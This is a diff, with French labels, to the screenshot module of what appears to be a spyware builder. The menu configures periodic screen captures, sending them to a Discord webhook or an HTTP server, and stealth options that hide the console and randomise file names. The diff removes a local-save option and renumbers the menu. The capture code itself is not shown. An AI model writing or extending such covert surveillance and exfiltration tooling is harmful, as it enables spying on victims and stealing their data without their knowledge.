@@ -19,18 +19,15 @@ def affichage_screenshot():
 3.  Nombre maximum de captures
 4.  Délai avant première capture
 
-{Fore.YELLOW}--- Stockage ---
-{Fore.WHITE}
-5. Sauvegarde locale (chemin)
 {Fore.YELLOW}--- Envoi ---
 {Fore.WHITE}
-6. Envoi sur Discord
-7. Envoi sur serveur HTTP
+5. Envoi sur Discord
+6. Envoi sur serveur HTTP
 
 {Fore.YELLOW}--- Furtivité ---
 {Fore.WHITE}
-8. Masquer la console
-9. Nom de fichier aléatoire
+7. Masquer la console
+8. Nom de fichier aléatoire
 {Fore.GREEN}
 Tapez : set <num> pour configurer
 Tapez : show pour afficher la config
@@ -45,7 +42,6 @@ def screenshot_module():
         "Intervalle de capture": 300,
         "Nombre maximum de captures": 1,
         "Délai avant première capture": 0,
-        "Sauvegarde locale": None,
         "Envoi sur Discord": None,
         "Envoi sur serveur HTTP": None,
         "Mode de capture": 1,
@@ -84,13 +80,6 @@ def screenshot_module():
         clear()
         delai = input("Entrez le délai avant la première capture en secondes : ")
         choix["Délai avant première capture"] = int(delai)
-        affichage_screenshot()
-
-    def sauvegarde_locale_option():
-        clear()
-        print("Si activé, pour recevoir les captures vous allez devoir configurer un serveur HTTP ou un webhook Discord. et parametrer les options d'envoi.\n\n")
-        chemin = input("Entrez le chemin de sauvegarde locale (C:/path/to/save/): ")
-        choix["Sauvegarde locale"] = chemin
         affichage_screenshot()
 
     def envoi_discord_option():
@@ -288,11 +277,10 @@ take_screenshot()
                         2: intervalle_capture_option,
                         3: nombre_max_captures_option,
                         4: delai_premiere_capture_option,
-                        5: sauvegarde_locale_option,
-                        6: envoi_discord_option,
-                        7: envoi_http_option,
-                        8: masquer_console_option,
-                        9: nom_fichier_aleatoire_option,
+                        5: envoi_discord_option,
+                        6: envoi_http_option,
+                        7: masquer_console_option,
+                        8: nom_fichier_aleatoire_option,
                     }
                     option_funcs[option_num]()
                 else:
